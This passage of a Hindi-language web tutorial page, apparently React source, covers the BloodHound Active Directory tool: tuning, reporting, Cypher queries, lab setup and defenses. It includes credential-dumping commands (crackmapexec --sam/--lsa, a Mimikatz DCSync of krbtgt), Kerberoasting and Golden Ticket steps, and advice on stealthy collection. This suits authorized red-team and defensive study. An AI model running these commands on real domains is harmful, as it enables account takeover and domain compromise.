crackmapexec smb 192.168.1.50 -u user -p password --sam
crackmapexec smb 192.168.1.50 -u user -p password --lsa

# BloodHound से session data देखो
# जो user admin है उसका hash crack करो या relay करो`}
      />

      <h2>Performance Tuning</h2>
      <p>
        बड़े डोमेन्स (10,000+ users) में BloodHound slow हो सकता है। Performance optimize करने के लिए कुछ tips हैं।
      </p>
      <CodeBlock
        title="Performance Optimization"
        code={`# Neo4j memory बढ़ाओ (neo4j.conf):
dbms.memory.heap.initial_size=4G
dbms.memory.heap.max_size=8G
dbms.memory.pagecache.size=4G

# BloodHound CE में:
# Docker compose file में memory limits सेट करो
# PostgreSQL performance tuning करो

# SharpHound optimization:
# सिर्फ ज़रूरी data collect करो (All की जगह specific methods):
SharpHound.exe -c Group,Session,ACL,Trusts
# Loop mode से continuous collection:
SharpHound.exe -c All --loop --loopduration 02:00:00

# Neo4j indexes create करो (performance बढ़ती है):
# BloodHound GUI में settings -> Debug -> Create Indexes

# बड़े datasets के लिए:
# BloodHound CE use करो (better performance)
# PostgreSQL optimize करो
# समय-समय पर database purge करो और fresh import करो`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        BloodHound सिर्फ अटैक पाथ्स ही नहीं, बल्कि comprehensive AD security reports भी generate करता है। PlumHound extension reporting के लिए专门 बना है।
      </p>
      <CodeBlock
        title="PlumHound Reporting"
        code={`# PlumHound install करो:
git clone https://github.com/PlumHound/PlumHound.git
cd PlumHound
pip install -r requirements.txt

# BloodHound database से reports generate करो:
python3 PlumHound.py --server bolt://localhost:7687 --username neo4j --password password --allreports

# Specific reports:
python3 PlumHound.py --server bolt://localhost:7687 -p password --tasks easy
# easy = basic reports (Kerberoastable, AS-REP, Domain Admins)

# HTML report generate करो:
python3 PlumHound.py --server bolt://localhost:7687 -p password --tasks easy --reportHTML report.html

# Custom queries से report:
python3 PlumHound.py --server bolt://localhost:7687 -p password --tasks "MATCH (u:User {hasspn:true}) RETURN u.name"

# CE version में API से reporting:
curl -X GET http://localhost:8080/api/v2/domains -H "Authorization: Bearer token"`}
      />

      <h2>Comparison Table</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">BloodHound</th>
              <th className="text-left py-2 px-3 text-neon-green">PingCastle</th>
              <th className="text-left py-2 px-3 text-neon-green">ADRecon</th>
              <th className="text-left py-2 px-3 text-neon-green">PlumHound</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">टाइप</td><td className="py-2 px-3">ग्राफ़ मैपिंग</td><td className="py-2 px-3">हेल्थ चेक</td><td className="py-2 px-3">रेकन</td><td className="py-2 px-3">रिपोर्टिंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">ग्राफ़ DB</td><td className="py-2 px-3">Neo4j</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">Neo4j</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">विज़ुअलाइज़ेशन</td><td className="py-2 px-3">हाँ (GUI)</td><td className="py-2 px-3">HTML रिपोर्ट</td><td className="py-2 px-3">CSV</td><td className="py-2 px-3">HTML/PDF</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">अटैक पाथ्स</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">कस्टम क्वेरी</td><td className="py-2 px-3">Cypher</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">Cypher</td></tr>
            <tr><td className="py-2 px-3 text-white">मुफ़्त</td><td className="py-2 px-3">हाँ (ओपन सोर्स)</td><td className="py-2 px-3">फ्री/पेड</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { problem: 'Neo4j स्टार्ट नहीं हो रहा', solution: 'Neo4j का वर्जन चेक करो — BloodHound 4.x को Neo4j 4.x चाहिए। पोर्ट 7474 और 7687 फ्री होने चाहिए। sudo neo4j console से देखो क्या एरर आ रहा है।' },
          { problem: 'SharpHound "Access Denied" दे रहा है', solution: 'यूज़र अकाउंट में डोमेन जॉइन्ड मशीन पर पर्याप्त परमिशन नहीं है। डोमेन यूज़र अकाउंट इस्तेमाल करो जिसे LDAP पढ़ने की परमिशन हो।' },
          { problem: 'BloodHound GUI खाली दिखा रहा है', solution: 'ZIP फाइल सही से इम्पोर्ट नहीं हुई। SharpHound का आउटपुट ZIP फाइल BloodHound GUI में ड्रैग & ड्रॉप करो। डेटा कलेक्शन पूरा हुआ कि नहीं चेक करो।' },
          { problem: 'शॉर्टेस्ट पाथ नहीं दिख रहा', solution: 'सभी कलेक्शन मेथड्स इस्तेमाल करो: SharpHound.exe -c All। Session कलेक्शन ज़रूरी है अटैक पाथ्स के लिए। --loop मोड इस्तेमाल करो।' },
          { problem: 'बहुत धीमा चल रहा है', solution: 'Neo4j मेमोरी बढ़ाओ (neo4j.conf में dbms.memory.heap.max_size)। बड़े डोमेन्स में SharpHound धीमा हो सकता है — --stealth मोड इस्तेमाल करो। BloodHound CE बेहतर परफॉर्मेंस देता है।' },
          { problem: 'Python bloodhound लाइब्रेरी एरर दे रही है', solution: 'pip install --upgrade bloodhound करो। DNS रिज़ॉल्यूशन चेक करो — -ns फ्लैग से DNS सर्वर स्पेसिफाई करो। NetBIOS नाम रिज़ॉल्यूशन भी चेक करो।' },
          { problem: 'BloodHound CE Docker start नहीं हो रहा', solution: 'Docker और Docker Compose versions चेक करो। पोर्ट 8080, 7474, 7687 फ्री होने चाहिए। docker compose logs से error देखो। Memory कम हो सकती है — कम से कम 4GB RAM चाहिए।' },
          { problem: 'SharpHound "KDC_ERR_S_PRINCIPAL_UNKNOWN" दे रहा है', solution: 'Service account SPN set नहीं है। या domain controller reach नहीं हो रहा। DNS settings check करो और DC IP manually specify करो: --domaincontroller dc01.target.local' },
          { problem: 'Graph visualization बहुत cluttered दिख रही है', solution: 'Left panel में node types filter करो। सिर्फ Users या Computers दिखाओ। Edge types भी filter करो — सिर्फ relevant relationships रखो। "Path finding" mode use करो instead of full graph.' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-red-400 font-mono font-semibold mb-2">❌ {item.problem}</h4>
            <p className="text-gray-400 text-sm">✅ {item.solution}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        BloodHound का डिटेक्शन और AD की सुरक्षा दोनों ज़रूरी हैं। Blue टीम्स को पता होना चाहिए कि SharpHound कैसे डिटेक्ट करें और अटैक पाथ्स कैसे तोड़ें।
      </p>
      <CodeBlock
        title="Detection & Defense"
        code={`# SHARPHOUND डिटेक्शन:

# 1. LDAP क्वेरी मॉनिटरिंग:
# Windows Event ID 1644 — LDAP क्वेरीज़ लॉग करो
# SharpHound बहुत सारी LDAP क्वेरीज़ भेजता है

# 2. नेटवर्क ट्रैफ़िक:
# असामान्य LDAP ट्रैफ़िक देखो — SharpHound हज़ारों क्वेरीज़ भेजता है

# 3. Process मॉनिटरिंग:
# SharpHound.exe प्रोसेस देखो
# .NET assemblies जो LDAP कॉल कर रही हैं

# 4. Honeypot अकाउंट्स:
# फेक अकाउंट्स बनाओ जो Domain Admin मेंबर दिखें
# जब कोई इन्हें टार्गेट करे — अलर्ट आएगा

# DEFENSE — अटैक पाथ्स तोड़ो:
# 1. Admin tiering — Tier 0, 1, 2 सेपरेशन
# 2. अनावश्यक AdminTo रिलेशनशिप्स हटाओ
# 3. Service accounts को AdminTo न दो
# 4. LAPS (Local Admin Password Solution) लगाओ
# 5. Kerberoastable SPNs हटाओ
# 6. AS-REP रोस्टिंग रोको (DONT_REQ_PREAUTH हटाओ)
# 7. GPO enforcement — लोकल एडमिन ग्रुप कंट्रोल करो`}
      />
      <CodeBlock
        title="Active Directory Hardening"
        code={`# Kerberoasting mitigation:
# Service accounts को long complex passwords दो (25+ chars)
# Group Managed Service Accounts (gMSA) use करो
# SPN accounts को Domain Admin से हटाओ

# AS-REP Roasting mitigation:
# DONT_REQ_PREAUTH flag हटाओ सभी accounts से:
Set-ADAccountControl -Identity user -DoesNotRequirePreAuth $false

# Unconstrained Delegation हटाओ:
# Computers को constrained delegation दो
# Unconstrained delegation set करने से बचो

# Admin tiering implement करो:
# Tier 0: Domain Controllers, Domain Admins
# Tier 1: Servers, App Admins
# Tier 2: Workstations, Users
# Cross-tier admin access block करो

# LAPS deploy करो:
# Local Admin Password Solution install करो
# हर machine का local admin password unique होगा
# BloodHound LAPS-enabled machines track करता है`}
      />

      <h2>Lab Environment Setup</h2>
      <p>
        BloodHound सीखने के लिए अपना AD लैब बनाओ। VirtualBox या VMware में Windows Server और कुछ क्लाइंट मशीन्स सेटअप करो।
      </p>
      <CodeBlock
        title="AD Lab Setup"
        code={`# ज़रूरी मशीन्स:
# 1. Windows Server 2019/2022 — Domain Controller
# 2. Windows 10/11 — Domain Member (2-3 मशीन्स)
# 3. Kali Linux — BloodHound चलाने के लिए

# स्टेप 1: Windows Server पर AD DS इंस्टॉल:
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "lab.local" -DomainNetBIOSName "LAB"

# स्टेप 2: यूज़र्स और ग्रुप्स बनाओ:
New-ADUser -Name "TestUser1" -SamAccountName "testuser1"
New-ADGroup -Name "Tier1Admins" -GroupScope Global
Add-ADGroupMember -Identity "Domain Admins" -Members "Administrator"

# स्टेप 3: कंप्यूटर्स जॉइन करो:
# Windows 10 मशीन्स को डोमेन में जॉइन करो

# स्टेप 4: SharpHound चलाओ:
# डोमेन मेंबर मशीन से:
SharpHound.exe -c All

# स्टेप 5: Kali पर BloodHound में इम्पोर्ट करो
# Neo4j + BloodHound GUI शुरू करो
# ZIP फाइल ड्रैग & ड्रॉप करो`}
      />
      <CodeBlock
        title="Vulnerable AD Lab Config"
        code={`# Vulnerable configurations बनाओ (attack paths के लिए):

# 1. Kerberoastable service account:
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" -ServicePrincipalNames "MSSQLSvc/sql01.lab.local"
Set-ADAccountPassword -Identity "svc_sql" -NewPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force)
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_sql"

# 2. AS-REP Roastable user:
New-ADUser -Name "roastme" -SamAccountName "roastme"
Set-ADAccountControl -Identity "roastme" -DoesNotRequirePreAuth $true

# 3. Local admin on multiple machines:
Add-ADGroupMember -Identity "Domain Admins" -Members "TestUser1"

# 4. Unconstrained delegation:
Set-ADComputer -Identity "sql01" -TrustedForDelegation $true

# 5. DCSync rights:
# एक user को Replicating Directory Changes दो

# अब SharpHound चलाओ और BloodHound में देखो
# "Find Shortest Paths to Domain Admin" query से सब paths दिखेंगे`}
      />

      <h2>Cypher Queries Reference</h2>
      <p>
        BloodHound की real power Cypher queries में है। Neo4j Cypher query language से custom attack paths ढूंढ सकते हो जो pre-built queries में नहीं हैं। यह red team operations में बहुत useful है।
      </p>
      <CodeBlock
        title="Essential Cypher Queries"
        code={`# सभी Domain Admins:
MATCH (g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"}) MATCH (u:User) RETURN u.name

# Kerberoastable users:
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

# AS-REP Roastable users:
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# Computers जहाँ Domain Users local admin हैं:
MATCH p=shortestPath((g:Group {name:"DOMAIN USERS@TARGET.LOCAL"})-[MemberOf|AdminTo*1..]->(c:Computer)) RETURN p

# Unconstrained Delegation computers:
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

# DCSync rights वाले users:
MATCH p=shortestPath((u:User)-[MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain)) RETURN p

# Sessions (logged in users):
MATCH (c:Computer)-[:HasSession]->(u:User) RETURN c.name, u.name

# Shortest path to Domain Admin from any user:
MATCH p=shortestPath((u:User)-[MemberOf|AdminTo|HasSession*1..]->(g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"})) RETURN p`}
      />
      <CodeBlock
        title="Custom Attack Path Queries"
        code={`# High Value targets with weak paths:
MATCH (n {highvalue:true}), (u:User), p=shortestPath((u)-[*1..5]->(n)) RETURN p

# Computers with LAPS (Local Admin Password Solution):
MATCH (c:Computer {haslaps:true}) RETURN c.name

# Computers WITHOUT LAPS:
MATCH (c:Computer {haslaps:false}) RETURN c.name

# Foreign group membership (cross-domain):
MATCH (u:User)-[:MemberOf]->(g:Group) WHERE NOT g.domain = u.domain RETURN u.name, g.name

# Users with SPN set (Kerberoastable):
MATCH (u:User) WHERE u.serviceprincipalnames IS NOT NULL RETURN u.name, u.serviceprincipalnames

# AdminCount = 1 users (privileged):
MATCH (u:User {admincount:true}) RETURN u.name

# Computers with constrained delegation:
MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate`}
      />

      <h2>Azure AD (Entra ID) Integration</h2>
      <p>
        BloodHound CE में Azure AD (अब Entra ID) integration है। Hybrid environments में on-premises AD और Azure AD दोनों का graph बनता है। यह cloud-based attack paths ढूंढने में मदद करता है।
      </p>
      <CodeBlock
        title="AzureHound Usage"
        code={`# AzureHound install करो:
# GitHub से latest release download करो

# Azure AD login:
az login

# AzureHound collect करो:
azurehound start -u user@company.com -p password --tenant <tenant-id>

# BloodHound CE में import करो:
# ZIP फाइल upload करो

# Azure-specific queries:
# Azure Global Admins:
MATCH (n:AZRole {name:"Global Administrator"}) RETURN n

# Azure VMs with admin access:
MATCH p=shortestPath((u:User)-[MemberOf|AZGlobalAdmin|AZVMAdmin*1..]->(v:AZVM)) RETURN p

# Hybrid attack paths (on-prem to Azure):
MATCH p=shortestPath((u:User)-[MemberOf|SyncedTo*1..]->(a:AZUser)) RETURN p`}
      />

      <h2>Advanced Techniques</h2>
      <p>
        BloodHound में कुछ एडवांस्ड टेक्निक्स हैं जो रेड टीम्स इस्तेमाल करती हैं। ये टेक्निक्स AD की कॉम्प्लेक्स कमज़ोरियों को एक्सप्लॉइट करती हैं।
      </p>
      <CodeBlock
        title="Advanced Techniques"
        code={`# KERBEROAST ATTACK PATH:
# 1. BloodHound में "Find Kerberoastable Users" क्वेरी चलाओ
# 2. SPN वाले यूज़र्स मिलेंगे
# 3. Mimikatz/Invoke-Kerberoast से TGS रिक्वेस्ट करो
# 4. हैश क्रैक करो

# AS-REP ROASTING PATH:
# 1. "Find AS-REP Roastable Users" क्वेरी
# 2. DONT_REQ_PREAUTH वाले यूज़र्स
# 3. GetNPUsers.py से हैश निकालो
# 4. हैश क्रैक करो

# DCSync PATH:
# 1. "Find Principals with DCSync Rights" क्वेरी
# 2. GetChanges + GetChangesAll वाले यूज़र्स
# 3. Mimikatz: lsadump::dcsync /domain:target.local /user:krbtgt
# 4. Golden Ticket बनाओ

# ACL ABUSE PATH:
# 1. GenericAll, WriteDacl, ForceChangePassword एजेज़ ढूंढो
# 2. यूज़र प्रॉपर्टीज़ बदलो
# 3. SPN सेट करो या पासवर्ड रीसेट करो

# CROSS-FOREST TRUST PATH:
# 1. Trusts कलेक्शन चलाओ
# 2. फॉरेन ग्रुप मेंबरशिप ढूंढो
# 3. फॉरेन सिड हिस्ट्री एब्यूज करो`}
      />

      <h2>BloodHound CE API Usage</h2>
      <p>
        BloodHound CE में REST API available है जिससे automated queries और reporting कर सकते हो। यह CI/CD pipelines और automated security assessments में useful है।
      </p>
      <CodeBlock
        title="BloodHound CE API"
        code={`# Login और token प्राप्त करो:
curl -X POST http://localhost:8080/api/v2/login \\
  -H "Content-Type: application/json" \\
  -d '{"login_method":"secret","username":"admin","password":"admin"}'

# Token से API calls:
TOKEN="your_jwt_token"

# सभी domains list करो:
curl -X GET http://localhost:8080/api/v2/domains \\
  -H "Authorization: Bearer $TOKEN"

# Users list करो:
curl -X GET http://localhost:8080/api/v2/domains/{domain_id}/users \\
  -H "Authorization: Bearer $TOKEN"

# Computers list करो:
curl -X GET http://localhost:8080/api/v2/domains/{domain_id}/computers \\
  -H "Authorization: Bearer $TOKEN"

# Shortest path query:
curl -X GET "http://localhost:8080/api/v2/graphs/shortest-path?start_type=User&end_type=Group&end_name=DOMAIN ADMINS@TARGET.LOCAL" \\
  -H "Authorization: Bearer $TOKEN"

# Python से API automation:
# python3 -c "
# import requests
# base = 'http://localhost:8080/api/v2'
# r = requests.post(f'{base}/login', json={'login_method':'secret','username':'admin','password':'admin'})
# token = r.json()['data']['session_token']
# headers = {'Authorization': f'Bearer {token}'}
# domains = requests.get(f'{base}/domains', headers=headers).json()
# print(domains)
# "`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या BloodHound बिना Neo4j के चल सकता है?', a: 'पुराने वर्जन (4.x) को Neo4j ज़रूरी है। नया BloodHound CE PostgreSQL इस्तेमाल करता है और Docker में आता है — अलग से Neo4j इंस्टॉल करने की ज़रूरत नहीं।' },
          { q: 'SharpHound डिटेक्ट हो सकता है?', a: 'हाँ, SharpHound हज़ारों LDAP क्वेरीज़ भेजता है जो Event ID 1644 में दिखती हैं। --stealth मोड से कम क्वेरीज़ भेजता है, लेकिन फिर भी डिटेक्ट हो सकता है।' },
          { q: 'क्या BloodHound Python वर्जन सेफ है?', a: 'bloodhound-python लाइब्रेरी भी LDAP क्वेरीज़ भेजती है। डिटेक्शन रिस्क वही है। Linux से चलाने का फायदा यह है कि Windows मशीन एक्सेस करने की ज़रूरत नहीं।' },
          { q: 'बड़े डोमेन्स में कितना टाइम लगता है?', a: '10,000+ यूज़र्स वाले डोमेन में SharpHound को 30 मिनट से 2 घंटे लग सकते हैं। --stealth मोड और स्पेसिफिक कलेक्शन मेथड्स से टाइम कम होता है। BloodHound CE बेहतर परफॉर्मेंस देता है।' },
          { q: 'क्या BloodHound Azure AD भी सपोर्ट करता है?', a: 'BloodHound CE में Azure AD (Entra ID) सपोर्ट है। AzureHound डेटा कलेक्टर Azure AD का डेटा कलेक्ट करता है। पुराने वर्जन में Azure सपोर्ट सीमित है।' },
          { q: 'BloodHound से डेटा कैसे रिमूव करें?', a: 'Neo4j में: MATCH (n) DETACH DELETE n। BloodHound CE में GUI में "Purge Database" ऑप्शन है। डेटा कलेक्शन के बाद ज़रूरी है कि डेटा सेफ रखो और टेस्टिंग के बाद डिलीट करो।' },
          { q: 'क्या BloodHound cross-forest trusts भी दिखाता है?', a: 'हाँ, SharpHound -c Trusts से cross-forest trust relationships collect होती हैं। "Find Principals with Foreign Domain Group Membership" क्वेरी से cross-domain attack paths दिखते हैं।' },
          { q: 'BloodHound CE और legacy BloodHound में क्या फ़र्क है?', a: 'CE में PostgreSQL backend (Neo4j की जगह), Docker deployment, better performance, Azure AD support, और API access है। Legacy version में Neo4j + Electron GUI था। CE recommended है नए setups के लिए।' },
          { q: 'क्या BloodHound domain admin credentials बिना चल सकता है?', a: 'हाँ, किसी भी domain user account से SharpHound चल सकता है जिसे LDAP read permission हो। Domain admin ज़रूरी नहीं है। लेकिन admin account से ज़्यादा data collect होता है।' },
          { q: 'SharpHound कितना network traffic generate करता है?', a: 'बड़े डोमेन में SharpHound हज़ारों LDAP queries भेजता है — यह detectable है। --stealth mode से traffic कम होता है लेकिन data भी कम collect होता है। Loop mode में continuous traffic होती है।' },
          { q: 'क्या BloodHound GPO abuse paths भी दिखाता है?', a: 'हाँ, GPLink edges से GPO-to-OU relationships दिखती हैं। अगर किसी GPO में "Restricted Groups" policy है जो local admin group में users add करती है, तो BloodHound यह path दिखाएगा। GPO abuse powerful lateral movement technique है।' },
          { q: 'BloodHound data export कैसे करें?', a: 'Neo4j cypher-shell से CSV export कर सकते हो। PlumHound से HTML/PDF reports generate होती हैं। CE version में API से JSON export possible है। SharpHound raw data ZIP file भी keep करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-neon-green font-mono font-semibold mb-2">❓ {item.q}</h4>
            <p className="text-gray-400 text-sm">{item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">लिंक</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PingCastle</td><td className="py-2 px-3">AD हेल्थ चेक और रिस्क असेसमेंट</td><td className="py-2 px-3">pingcastle.com</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ADRecon</td><td className="py-2 px-3">AD रेकन और रिपोर्टिंग</td><td className="py-2 px-3">GitHub</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PlumHound</td><td className="py-2 px-3">BloodHound रिपोर्टिंग इंजन</td><td className="py-2 px-3">GitHub</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">MANSPIDER</td><td className="py-2 px-3">फाइल शेयर रेकन + BloodHound</td><td className="py-2 px-3">GitHub</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Certify</td><td className="py-2 px-3">AD Certificate Services अटैक</td><td className="py-2 px-3">GitHub</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Whisker</td><td className="py-2 px-3">Shadow Credentials अटैक</td><td className="py-2 px-3">GitHub</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">PowerView</td><td className="py-2 px-3">AD enumeration PowerShell</td><td className="py-2 px-3">GitHub</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">SharpHound</td><td className="py-2 px-3">BloodHound data collector</td><td className="py-2 px-3">GitHub</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">AzureHound</td><td className="py-2 px-3">Azure AD data collector</td><td className="py-2 px-3">GitHub</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>SharpHound को --loop मोड में चलाओ — कंटीन्यूअस डेटा कलेक्शन होगा और session changes track होंगे</li>
          <li>सभी कलेक्शन मेथड्स इस्तेमाल करो: -c All — कम करने से अटैक पाथ्स मिस हो सकते हैं</li>
          <li>BloodHound + Mimikatz कॉम्बो बहुत पावरफुल है — Mimikatz से हैशेस, BloodHound से अटैक पाथ</li>
          <li>Blue टीम के लिए भी BloodHound इस्तेमाल करो — AD की कमज़ोरियां पहचानो और ठीक करो</li>
          <li>बड़े डोमेन्स में BloodHound CE इस्तेमाल करो — बेहतर परफॉर्मेंस और नए फीचर्स</li>
          <li>Honeypot accounts बनाओ Domain Admin group में — जब SharpHound इन्हें target करे, alert आएगा</li>
          <li>Cypher queries save करो और reuse करो — custom queries बहुत useful हैं specific findings के लिए</li>
          <li>BloodHound data regularly purge करो testing के बाद — sensitive data leak risk होता है</li>
          <li>PlumHound से automated reports generate करो — client deliverables के लिए professional reports मिलती हैं</li>
          <li>AzureHound से cloud environment भी map करो — hybrid attack paths बहुत common हैं</li>
          <li>Custom Cypher queries library बनाओ — हर engagement में reuse होगी</li>
          <li>SharpHound --stealth mode production environments में use करो — detection risk कम होता है</li>
          <li>BloodHound data को encrypted storage में रखो — AD data बहुत sensitive है</li>
          <li>Purple team exercises में BloodHound both sides पर use करो — attack paths identify और fix करो</li>
          <li>Honeypot accounts बनाओ Domain Admin group में — detection mechanism के रूप में</li>
          <li>BloodHound CE API से automated reporting pipeline बनाओ — SIEM integration के लिए</li>
          <li>SharpHound output ZIP files encrypt करो transfer करते समय — sensitive AD data है</li>
          <li>Regular AD audits के लिए monthly BloodHound scans schedule करो</li>
          <li>Cross-forest trusts minimize करो — हर trust relationship potential attack path है</li>
          <li>Service accounts को least privilege दो — Domain Admin membership avoid करो</li>
          <li>AD Certificate Services abuse paths भी check करो — ADCS attacks बहुत common हैं</li>
          <li>BloodHound CE Docker deployment का regular backup लो — database loss critical है</li>
          <li>Kerberoastable accounts को gMSA (Group Managed Service Accounts) से replace करो — much safer</li>
          <li>AS-REP Roasting prevent करने के लिए सभी users पर DONT_REQ_PREAUTH flag हटाओ</li>
          <li>Unconstrained delegation हटाओ — constrained delegation use करो instead</li>
          <li>AD Certificate Services (ADCS) abuse paths check करो — ESC1-ESC8 vulnerabilities</li>
          <li>BloodHound data retention policy बनाओ — engagement के बाद 30 days में delete करो</li>
          <li>Network segmentation implement करो — cross-VLAN admin access minimize करो</li>
          <li>Privileged Access Management (PAM) solution deploy करो — admin sessions monitor होंगे</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फ़ाइनल चेतावनी:</strong> BloodHound केवल अधिकृत Red Team ऑपरेशंस और सुरक्षा ऑडिट में ही इस्तेमाल करें। बिना अनुमति के AD रेकन गंभीर अपराध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत एक्सेस और रेकन दंडनीय है। केवल अपने लैब वातावरण या लिखित अनुमति के साथ ही उपयोग करें। SharpHound का डेटा संवेदनशील है — सुरक्षित रखें और टेस्टिंग के बाद डिलीट करें।
      </div>
    </TutorialLayout>
  )
}
